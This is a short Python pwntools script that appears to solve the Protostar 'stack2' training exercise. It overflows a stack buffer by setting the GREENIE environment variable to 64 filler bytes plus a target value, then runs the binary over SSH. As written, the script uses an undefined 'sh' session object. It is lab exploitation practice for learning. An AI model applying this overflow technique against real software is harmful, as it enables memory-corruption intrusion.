#!/usr/bin/python
from pwn import *
from ssh import *

binarypath='/opt/protostar/bin/stack2'
GREENIE="A"*64+p32(0x0d0a0d0a)
p=sh.run(binarypath,env={'GREENIE':GREENIE})
print p.recvall()